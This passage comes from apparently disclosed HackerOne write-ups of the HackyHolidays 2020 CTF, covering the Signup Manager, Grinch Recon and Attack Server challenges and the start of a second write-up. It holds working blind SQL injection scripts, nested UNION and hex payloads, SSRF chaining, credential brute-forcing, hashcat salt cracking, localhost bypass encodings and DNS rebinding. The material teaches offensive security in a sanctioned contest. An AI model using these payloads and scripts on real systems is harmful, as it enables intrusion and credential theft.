      query = 'select count(*) from quiz.admin where username="admin" and password like binary "' + tmp_known + '%" limit 1'
      query = '\' or ({}) = 1 -- '.format(query)
      print(query)

      if (send_sqli(query)):
        known += char
        found_next = True
        print(known)
        break
    if (not found_next):
      print('Unable to find the next char, terminating')
      exit(0)
    elif (len(known) == known_max_len):
      print('Found the first {} chars: {}'.format(known_max_len, known))
      exit(0)

get_data()
```

When all payloads will be executed, we will get the database dump:
```
quiz
  admin
    id = 1
    password = S3creT_p4ssw0rd-$
    username = admin
```

Let's log in using the found credentials, and there will be the flag:

{F1138108}

- The 9th flag: `flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`.

# Signup Manager

This app allows us to log in or signup. To sign up, we need to provide five parameters: `username`, `password`, `age`, `firstname` and `lastname`.

When we use existing username on signup, the server returns *Username already exists* error. When username is unique, the server creates a new user and returns the following page:

{F1138110}

Login/password bruteforce attack is impossible here, because the server returns the universal error message when the credentials are incorrect.

Let's take a look at the source code of the main page. On the top line there is `<!-- See README.md for assistance -->` HTML comment. https://hackyholidays.h1ctf.com/signup-manager/README.md returns the following content:

```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

# How to Install
1. Create a directory that you wish SignUp Manager to be installed into
2. Move signupmanager.zip into the new directory and unzip it
3. For security move users.txt into a directory that cannot be read from website visitors
4. Update index.php with the location of your users.txt file
5. Edit the user and admin php files to display your hidden content
6. You can make anyone an admin by changing the last character in the users.txt file to a Y
7. Default login is admin / password
```

As we see, there is a small instruction how to install *Signup Manager* app. The users data is stored somewhere on the disk, and if the last character of the user record is `Y`, then this user is an admin. Also there is a name of zip archive *signupmanager.zip*. Let's try to download it. The archive contains a few files:

- admin.php
- index.php
- user.php
- signup.php
- README.md

Let's look at index.php code. There are two functions: `buildUsers` and `addUser`.

- `buildUsers` - loads all the users from the file into array, and for each string, creates a record with user details parsing this string. This function is calling on each request.
- `addUser` - creates user string by a special format and adds it into the users file, sets the last letter of the string to `N` (not admin).

```php
function buildUsers() {
    $users = array();
    $users_txt = file_get_contents('users.txt');
    foreach( explode(PHP_EOL,$users_txt) as $user_str ) {
        if(strlen($user_str) == 113) {
            $username = str_replace('#', '', substr($user_str, 0, 15));
            $users[$username] = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
            );
        }
    }
    return $users;
}

function addUser($username,$password,$age,$firstname,$lastname) {
    $random_hash = md5(print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand());
    $line = '';
    $line .= str_pad($username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad($age,3,"#");
    $line .= str_pad($firstname,15,"#");
    $line .= str_pad($lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL,FILE_APPEND);
    return $random_hash;
}
```

If request contains *cookie* header, the app searches for an user record where `user.cookie` is equal to `request.cookie.token`. If user is found, the app redirects to `/admin.php` if  `user.admin` is true, or to `/user.php` otherwise.

```php
$page = 'signup.php';
if( isset($_COOKIE["token"]) ){
    foreach( $all_users as $u ){
        if( $u["cookie"] === $_COOKIE["token"] ){
            if( $u["admin"] ){
                $page = 'admin.php';
            }else{
                $page = 'user.php';
            }
        }
    }
}
```

Also there is a logic for processing *login* and *signup* actions.

- on *login* action the app searches for user record where `user.password` is equal to password md5 hash from the body. If user is found, the app sets cookie and redirects to the main page.
- on *signup* action the app validates five user fields:
  - removes non letters and numbers from `username`, `firstname` and `lastname`, validates that they have length less or equal to 15 letters.
  - creates md5 hash of the `password`.
  - validates that `age` is the number, its length is less or equal to 3 and converts its value to the number.
  - if there are no errors, the app calls `addUser` function, sets cookie token and redirects to the main page.

```php
if($page == 'signup.php') {
    $errors = array();
    if (isset($_POST["action"])) {
        if( $_POST["action"] == 'login' && isset($_POST["username"], $_POST["password"]) ){
            if( isset($all_users[ $_POST["username"] ]) ){
                $u = $all_users[ $_POST["username"] ];
                if( md5($_POST["password"]) === $u["password"] ){
                    setcookie('token', $u["cookie"], time() + 3600);
                    header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                    exit();
                }
            }
            $errors[] = 'Username and password combination not found';
        }
        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
            if (strlen($username) < 3) {
                $errors[] = 'Username must by at least 3 characters';
            } else {
                if (isset($all_users[$username])) {
                    $errors[] = 'Username already exists';
                }
            }
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            if (strlen($firstname) < 3) {
                $errors[] = 'First name must by at least 3 characters';
            }
            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            if (strlen($lastname) < 3) {
                $errors[] = 'Last name must by at least 3 characters';
            }
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
                setcookie('token', $cookie, time() + 3600);
                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                exit();
            }
        }
    }
}
```

Let's look at the user record string format:

- `username` => max length 15, if less, left padded by `#`.
- `password` => md5 hash, always has length 32 chars.
- `random_hash` => md5 hash generated by random data, always has length 32 chars.
- `age` => max length 3, if less, left padded by `#`.
- `firstname` and `lastname` the same as `username`.
- the last char: `N`.

Ok, so the goal is to create an user record string with *such* data, where the last letter will be `Y` (admin). The length of the string is 113 chars. We can't exceed the max length of `username`, `firstname` and `lastname`. The length of `password` and ``random_hash` is fixed. But what about `age`?

In PHP, the number can be presented in the different forms, and one of them is *scientific notation*: `1e1` equals to `10` in decimal form. 

Let's look again how `age` is processed in *signup* action:

```php
if (!is_numeric($_POST["age"])) {
    $errors[] = 'Age entered is invalid';
}
if (strlen($_POST["age"]) > 3) {
    $errors[] = 'Age entered is too long';
}
$age = intval($_POST["age"]);
```

If `age` parameter value will be equal to `1e9`, the both conditions will be passed, and in the end, the string `1e9` will be converted to the number `1000000000`. Later, in the `addUser` function where the user record string is generated, the number `1000000000` will be converted to the string `1000000000`.

We have done it! Now we can create a user record, where the last letter is `Y`.

- `username`=`johnsmith3`
- `password`=`pass$%^&`
- `age`=`1e9`
- `firstname`=`john`
- `lastname`=`smithYYYYYYYYYY`

The generated user record string is:

```
johnsmith3#####1a1dc91c907325c69271ddf0c944bc72ffd371da9900ca21d7c9aad6bc6f1bec1000000000john###########smithYYYY
```

Let's signup using the user details described above, and we will get the flag:

{F1138109}

- The 10th flag: `flag{99309f0f-1752-44a5-af1e-a03e4150757d}`.

# Grinch Recon

When, we have solved the challenge 10, we are given the link to the challenge 11: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59.

There is a photo album app, with three albums and some photos in each album. There are two known and two hidden paths (we will get them with `gobuster` running it in *dir* mode: `gobuster dir -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59 -w raft-small-directories.txt -t 50`): 

- `/album?hash=hash`
- `/picture?data=base64`
- `/uploads`
- `/api`

### /api

Returns a page with *Grinch API* HTTP status codes description for the different cases. When we are requesting any endpoint in `/api`, the response is `{"error":"This endpoint cannot be visited from this IP address"}`. Adding custom HTTP headers such as `X-Forwarded`, doesn't help, it seems that server validates the physical IP address of the client.

### /uploads

We don't have access to the page, the server returns error 403.

### /picture

Returns a picture, `data` parameter is a base64 encoded string. Let's look at this `data` value for example:
```
eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9
```

Decoded value is JSON object with two fields: `image` and `auth`: 

```json
{
  "image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg",
  "auth":"bbf295d686bd2af346fcd80c5398de9a"
}
```

`image` is the path to the picture, and the `auth` is some token, which looks like as md5 hash. Maybe there SSRF is possible? What if we can set own file path in `image` and generate `auth` for it? But unfortunately we can't. Looks like that server uses very long salt to generate md5 hash for `image` or maybe it's not md5 hash at all.

### /album

And the last one path returns a page with album name and the pictures related to this album, `hash` parameter is a randomly generated string. I see only one attack that we can try here, it's SQL injection on `hash` parameter. Let's try a simple SQLi:

- `jdh34k' and 1=1 -- .` returns the album page
- `jdh34k' and 1=0 -- .` returns 404 status code!

Good,  there is SQLi, let's run `sqlmap` to dump the database:

```bash
$ sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k -p hash --dbms MySQL --dump
```

Well, we see there two tables: *album* and *photo*, but no *users*, *admins*, *passwords*... so the flag is not here :(.

```
Table: album
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+

Table: photo
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+
```

Let's check how many fields selected in the query, will use *union attack* for that:

- `' and 1=0 union select 1 -- .` - error 404
- `' and 1=0 union select 1,2 -- .` - error 404
- `' and 1=0 union select 1,2,3 -- .` - album page

So the query selects three fields. Let's detect what fields are selected:

- the 1st field is `album.id`, because when we change the value to 1, 2 or 3, the pictures from the different albums are loaded. When the value is 4, no pictures are loaded.
- the 2nd field is unused on the page.
- and the 3rd field is `album.name`.

Now let's imagine how the app selects the data:

1.I suppose there are two SQL queries, in the first one, the album record is selected and filtered by `hash`:
```sql
select * from album
where hash='{hash}'
```

2.In the second one, the photo record is selected and filtered by `album_id`. And `album_id` is used from the previous query.
```sql
select * from photo
where album_id='{album_id}'
```

If my thoughts are correct, then we can inject SQLi inside of SQLi, to select **own** picture path:

- SQLi_2: `' and 1=0 union select 1,2,'our_path' -- .`
- SQLi_1: `' and 1=0 union select SQLi_2,2,3 -- .`

Then the second SQL (which one selects the photos) will be:

```sql
select * from photo
where album_id='' and 1=0 union select 1,2,'our_path' -- 
```

It is impossible to inject the second SQLi as a string, it must be MySQL *hexadecimal literal* string, like as `0xf01a`. Then the initial SQLi for the example above, will be:

```sql
' and 1=0 union select 0x2720616e6420313d3020756e696f6e2073656c65637420312c322c276f75725f7061746827202d2d20,2,3 -- 
```

Using the information, lets try to get content of the main app page: `/r3c0n_server_4fdk59`, for example. As was described above, the path in `image` looks like: `r3c0n_server_4fdk59/uploads/<picture file name>`, so to get the content of `/r3c0n_server_4fdk59`, the injection path must be `../../` .

1. SQLi_2 as a string: `' and 1=0 union select 1,2,'../../' -- .`
2. SQLi_2 in *hexadecimal literal* string format: `0x2720616e6420313d3020756e696f6e2073656c65637420312c322c272e2e2f2e2e2f27202d2d20`
3. SQLi_1: `' and 1=0 union select 0x2720616e6420313d3020756e696f6e2073656c65637420312c322c272e2e2f2e2e2f27202d2d20,2,3 -- `
4. Url: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash='%20and%201=0%20union%20select%200x2720616e6420313d3020756e696f6e2073656c65637420312c322c272e2e2f2e2e2f27202d2d20,2,3%20--%20`

The server returns the album page with an unloaded image:

{F1138112}

```html
<img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC8uLlwvIiwiYXV0aCI6ImQyY2I0NDNlZmQxMDQyNDdkYjMzODU4NGY3YjI1MTk5In0=">
```

Decoded string for `data` (as mentioned above it's base64 encoded string) is JSON object `{"image":"r3c0n_server_4fdk59\/uploads\/..\/..\/","auth":"d2cb443efd104247db338584f7b25199"}`. Good, our injection works as expected. So we got SSRF and we can get content of some interesting pages on the server?

Let's open the url from image src:

```
Invalid content type detected
```

Hmm, we expected something different, didn't we? Let's try to get content of other existing pages: https://hackyholidays.h1ctf.com or https://hackyholidays.h1ctf.com/robots.txt. Still the same error! But https://hackyholidays.h1ctf.com/assets/images/grinch-networks.png returns the image. So there is some logic on the server, which validates the response `Content-Type` header, and if it's not equal `image/*`, returns the error. But what the response will be for the not existing page? https://hackyholidays.h1ctf.com/not-existing:

```
Expected HTTP status 200, Received: 404
```

Well, the server validates SSRF response status code and returns it in the own response. Do you remember about `/api` in the app? Let's look again at the Grinch API status codes description:

{F1138111}

Using this table and the text in the response, we can bruteforce wordlist of most popular endpoints and find the valid API endpoints. 

Let's create python script to find API endpoints:

```python
import requests as req
import string
from urllib.parse import urlencode, quote
import re

URL = 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59'

def get_endpoints():
  with open('objects-lowercase.txt', 'r') as f:
    endpoint = f.readline()
    while endpoint:
      endpoint = endpoint.lower().strip()
      res = send_sqli(endpoint)
      if res:
        print('{} => {}, {}'.format(endpoint, res['status_code'], res['text']))
      endpoint = f.readline()

def send_sqli(payload):
  print(payload)
  query = "' and 1=0 union select 1,2,'../api/{}' -- ".format(payload).encode('utf-8').hex()
  params = {
    'hash': "?hash='and 1=0 union select 0x{},2,3 -- ".format(query)
  }
  res = req.get(URL + '/album', params=params)
  match = re.search(r'/picture\?data=([A-Za-z0-9=]+)', res.text)
  if match:
    return call_api(match.group(1))
  print_and_exit('Empty response for ' + payload)

def call_api(data):
  res = req.get(URL + '/picture?data=' + data)
  if (not re.search(r'Received: 404', res.text)):
    return {
      'status_code': res.status_code,
      'text': res.text
    }

def print_and_exit(message):
  print(message)
  exit(0)

get_endpoints()
```

There is only one valid endpoint - `/user`. When we call it without the query parameters, the response is `Invalid content type detected`, but when we call it with any parameter: `/api/user?foo=bar` for example, the response is `Expected HTTP status 200, Received: 400`. This status in Grinch API doc means that we sent invalid GET/POST variable(s). Let's think what parameters can accept `/user` endpoint?

- `id`
- `uuid`
- `login`
- `username`
- `password`
- two parameters

Let's try all of them. When we send two parameters:  `username` and `password`: `/api/user?username=&password=`, the response is `Expected HTTP status 200, Received: 204`. Good, we found the valid parameters. Now let's think how the server uses them  in the `/user` endpoint? I guess it filters users by them. So we can try to guess the both parameters' values, then `/user` endpoint will return status code 200 (select some user), and SSRF response will be `Invalid content type detected` again. Unfortunately  bruteforce attack can't be used here, because we will need to send the millions of requests. SQLi injection doesn't work also. But maybe the server doesn't escape wildcard characters: percentage ` %` and underscore `_` in SQL query? Let's try to send the following path: `/api/user?username=%25&password=%25`, and the response will be `Invalid content type detected`. Cool, that means, that we can use the same technics as we used in the *Evil Quiz* challenge.

Let's create the python script (it uses some functions from the script above):

```python
def get_data():
  known = ''
  known_max_len = 20

  charset = string.ascii_lowercase + string.digits + '_'
  while True:
    found_next = False
    for char in charset:
      temp_char = '\\' + char if char == '_' or char == '%' or char == '"' else char
      tmp_known = known + temp_char

      params = {
        'username': tmp_known + '%',
        'password': '%'
      }
      query = 'user/?{}'.format(urlencode(params, quote_via=quote))

      res = get_data(query)
      if res['text'] == 'Invalid content type detected':
        known += char
        found_next = True
        print(known)
        break
    if (not found_next):
      print_and_exit('Unable to find the next char')
    elif (len(known) == known_max_len):
      print_and_exit('Found the first {} chars: {}'.format(known_max_len, known))
```

It will find that username is `grinchadmin`, and the password is `s4nt4sucks` (btw, nice password:)).

Now, log in by using the found credentials, and there is a flag: 

{F1138114}

- The 11th flag: `flag{07a03135-9778-4dee-a83c-7ec330728e72}`.

# Grinch Network Attack Server

The last app allows us to attack Santa's servers to take them down.

There are three attacks created for us. Attack is launched using the data in `payload` query parameter: `eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==`. As we see, the value is base64 encoded string. The decode value is JSON object with `target` and `auth` fields: `{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}`. If target is valid (IPv4 address or Canonical name) and `hash` token is valid for this target, then app launches a new attack. After that, the client uses JSON polling to get the status of attack.

1. `/launch?payload=<base64>`
1. `/launch/<randomly-generated-token>.json`
1. `/launch/<randomly-generated-token>.json?id=<int>`

When attack is finished, we can get the complete log calling  `/launch/<randomly-generated-token>.json` (without `id`):

```json
[
  {"id":"32569","content":"Setting Target Information","goto":false},
  {"id":"32570","content":"Getting Host Information for: 203.0.113.213","goto":false},
  {"id":"32571","content":"Spinning up botnet","goto":false},
  {"id":"32572","content":"Launching attack against: 203.0.113.213 \/ 203.0.113.213","goto":false},
  {"id":"32573","content":"ping 203.0.113.213","goto":false},
  {"id":"32574","content":"64 bytes from 203.0.113.213: icmp_seq=1 ttl=118 time=18.6 ms","goto":false},
  {"id":"32575","content":"64 bytes from 203.0.113.213: icmp_seq=2 ttl=118 time=22.3 ms","goto":false},
  {"id":"32576","content":"64 bytes from 203.0.113.213: icmp_seq=3 ttl=118 time=21.8 ms","goto":false},
  {"id":"32577","content":"Host still up, maybe try again?","goto":false}
]
```

What this attack does? It tries to ping the selected host, and if it's down, returns a link in a `goto` field. Our goal is to take down the Grinch server, so we need to find a way how to send Grinch's host in `target`.

Let's look again at the decoded payload JSON:

```json
{
  "target":"203.0.113.33",
  "hash":"5f2940d65ca4140cc18d0878bc398955"
}
```

`hash` looks like as md5sum. If this is real md5 hash, how it can be generated?

1. `md5sum(target)`
2. `md5sum(target + salt)`
3. `md5sum(salt + target)`

The first statement is wrong, let's check other. We know the encrypted value - `203.0.113.33`, we know the hash -  `5f2940d65ca4140cc18d0878bc398955`, so we need to find a way how to guess `salt`!? For this task we can use, the super fast tool for password recovery - `hashcat`. We will run it with the following parameters:

- `-a 0` - *dictionary attack*, trying all the words in a list
- `-m 10` - *hash mode*, `salt + password`
-  `5f2940d65ca4140cc18d0878bc398955:203.0.113.33` - known hash and password
- `rockyou.txt` - the dictionary file

```bash
$ hashcat -O -m 10 -a 0 5f2940d65ca4140cc18d0878bc398955:203.0.113.33 rockyou.txt 
```

A few seconds after the start, `hashcat` will find the `salt` - `mrgrinch463`.

Let's use `mrgrinch463` to generate `auth` token for the localhost (127.0.0.1) `target` and launch the attack against Grinch's host:

- target: `127.0.0.1`
- salt: `mrgrinch463`
- string for encryption: `mrgrinch463127.0.0.1`
- md5sum for `mrgrinch463127.0.0.1`: `3e3f8df1658372edf0214e202acb460b`
- payload: `{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}`
- payload encoded in base64: `eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==`
- url: `https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ%3d%3d`

Hmm, but when we send the request, the log of the attack is:

```json
[
  {"id":"36389","content":"Setting Target Information","goto":false},
  {"id":"36392","content":"Getting Host Information for: 127.0.0.1","goto":false},
  {"id":"36393","content":"Local target detected, aborting attack","goto":false}
]
```

It seems, that the server has some SSRF protection mechanism. Well, IP address can be represented in the dozens of formats, let's try to bypass the server protection using one of them:

- dot notation: `127.0.0.1`
- localhost: `localhost`
- IPv6: `[::1]`
- drop the zeros: `127.0.1`
- drop the zeros: `127.1`
- decimal: `2130706433`
- octal: `017700000001`
- hex: `7f000001`
- hex: `0x7f.0.0.1`

Unfortunately, all of them doesn't work. 

But what about a canonical name? Let's run attack against `hackyholidays.h1ctf.com` target:

```json
[
  {"id":"36293","content":"Setting Target Information","goto":false},
  {"id":"36295","content":"Getting Host Information for: hackyholidays.h1ctf.com","goto":false},
  {"id":"36296","content":"Host resolves to 18.216.153.32","goto":false},
  {"id":"36297","content":"Local target detected, aborting attack","goto":false}
]
```

The response almost the same as above, **but now**, the server resolves the hostname with DNS. What if the server validates IP after DNS resolving and after that pings the original hostname?

There is the type of SSRF attack called *DNS rebinding*. Shortly, this is a method of manipulating resolution of domain names. Let's build our *SSRF DNS rebinding* attack. We need to have hostname that will be resolved to 1.1.1.1 (for example) on the first call to bypass the server SSRF protection, and resolved to 127.0.0.1 every time after that, and we'll attack the Grinch's host.

For this attack we will use [Whonow DNS Server](https://github.com/brannondorsey/whonow) tool, there is already the working server that can do what we need. Build target url `A.1.1.1.1.1time.127.0.0.1.forever.rebind.network`, and let's run attack against it:

```js
[
  {"id":"38456","content":"Setting Target Information","goto":false},
  {"id":"38457","content":"Getting Host Information for: A.1.1.1.1.1time.127.0.0.1.forever.rebind.network","goto":false},
  {"id":"38458","content":"Host resolves to 1.1.1.1","goto":false},
  {"id":"38459","content":"Spinning up botnet","goto":false},
  {"id":"38460","content":"Launching attack against: A.1.1.1.1.1time.127.0.0.1.forever.rebind.network \/ 127.0.0.1","goto":false},
  {"id":"38461","content":"No Response from attack server, retrying...","goto":false},
  {"id":"38462","content":"No Response from attack server, retrying...","goto":false},
  {"id":"38463","content":"No Response from attack server, retrying...","goto":"\/attack-box\/challenge-completed-a3c589ba2709"}
]
```

Wow, we got a link in `goto` field, let's open it, and there is the last flag:

{F1138115}

- The 12th flag: `flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`.

# Conclusion

I would like to say "big thanks" to the organizers and to all the people who helped me, when I have been stuck. It was really fun event:)!

# References

- [gobuster](https://github.com/OJ/gobuster)
- [John the Ripper](https://www.openwall.com/john/)
- [thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [hashcat](https://hashcat.net/hashcat/)
- [rebind.network](https://github.com/brannondorsey/whonow)
- [MD5 conversion and reverse lookup](https://md5.gromweb.com/)
- [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)
- [Scientific notation](https://en.wikipedia.org/wiki/Scientific_notation)
- [SQL injection UNION attacks](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections)
- [MySQL Hexadecimal Literals](https://dev.mysql.com/doc/refman/8.0/en/hexadecimal-literals.html)
- [MD5 hash with salt](https://www.md5online.org/blog/md5-salt-hash/)
- [Server-Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Hacker0x01 Twitter](https://twitter.com/Hacker0x01)
- [Hacky-Holidays Discord channel](https://discord.com/channels/514337135491416065/787419201148813393)

## Impact

Taking Santa's servers down and canceling Christmas!

---

### [HackyHolidays 2020 Full Write-up: Information Disclosure of 12 Flags](https://hackerone.com/reports/1068434)

- **Report ID:** `1068434`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** h1-ctf
- **Reporter:** @liamg
- **Bounty:** - usd
- **Disclosed:** 2021-01-11T22:37:04.318Z
- **CVE(s):** -

**Vulnerability Information:**

## Intro

This is my report for the 2020 Hacky Holidays HackerOne CTF. I managed to find all 12 flags with the assistance of my little helper, Jake. He specialises in brute-forcing via a unique keyboard mashing technique:

{F1134543}

Anywho, let's get started...

## Flag 1: Robots

The first one was a nice easy find as a result of some basic enumeration.

Looking in [/robots.txt](https://hackyholidays.h1ctf.com/robots.txt), I immediately spotted the flag:

```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```

Flag: `flag{48104912-28b0-494a-9995-a203d1e261e7}`

## Flag 2: Moved

The content of the `robots.txt` file also contained a clue about the second flag:

```
Disallow: /s3cr3t-ar3a
```

There was a [/s3cr3t-ar3a](https://hackyholidays.h1ctf.com/s3cr3t-ar3a) page which the server requested spiders to avoid. Very suspect!

The secret area consisted of a message telling me the page had moved.

If I had hit "inspect element" and browsed the DOM I could have quite quickly spotted the flag.

{F1134542}

However...

### Unintended Solution

I'm ashamed to say I went the much longer way around. I initially viewed the static source code of the page, and noticed that the jQuery library wasn't loaded from a CDN like everything else on the site.

Viewing the file showed the version of jQuery:

```
/*! jQuery v3.5.1 ...
```

I downloaded the file and then grabbed the "real" jQuery v3.5.1. Diffing them showed an interesting anomaly in the CTF version of the file:

{F1134541}

Interesting! Piecing it together revealed the flag. At this point I realised I could have just inspected element and seen the flag. Whoops.

Flag: `flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`

## Flag 3: People Rater

The last challenge hinted at the existence of the `/apps` page. On this page I found another link, this time to the People Rater application at [/people-rater](https://hackyholidays.h1ctf.com/people-rater).

I was presented with a list of buttons, each with the name of a person. Clicking a button resulted in an alert box with a description of the person.

Digging a little deeper with dev tools, I could see that when I clicked a button, an HTTP request was made in the background. One such example is `https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=`, which responded with:

```json
{"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}
```

It looked like that `id` was base64 encoded. Decoding it resulted in:

```json
{"id":2}
```

Going through the rest of the list and decoding the `id` field for each revealed that there was no record with an `id` of `1` in the list. Perhaps there was something interesting in the missing record?

I base64 encoded some JSON with an `id` of `1`:

```bash
$ echo '{"id":1}' | base64 
eyJpZCI6MX0K
```

...and supplied the resultant value to the `entry` endpoint: [/people-rater/entry?id=eyJpZCI6MX0K](https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0K), and got a nice response:

```json
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```

There was the flag!

Flag: `flag{b705fb11-fb55-442f-847f-0931be82ed9a}`

## Flag 4: Swag Shop

A quick browse of the swag shop source code revealed the existence of an API:

{F1134539}

I decided to try a bit of fuzzing to reveal any other API endpoints that might help me to progress.

Fuzzing with:

```bash
scout url -s https://hackyholidays.h1ctf.com/swag-shop/api
```

...revealed:

```
/swag-shop/api/user
/swag-shop/api/sessions
```

Hitting the `user` endpoint gave a 400 status and told me I was missing required parameters. I put that to one side for a moment and started to look at `sessions` instead.

The `sessions` endpoint returned a list of sessions!

```json
{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=","eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5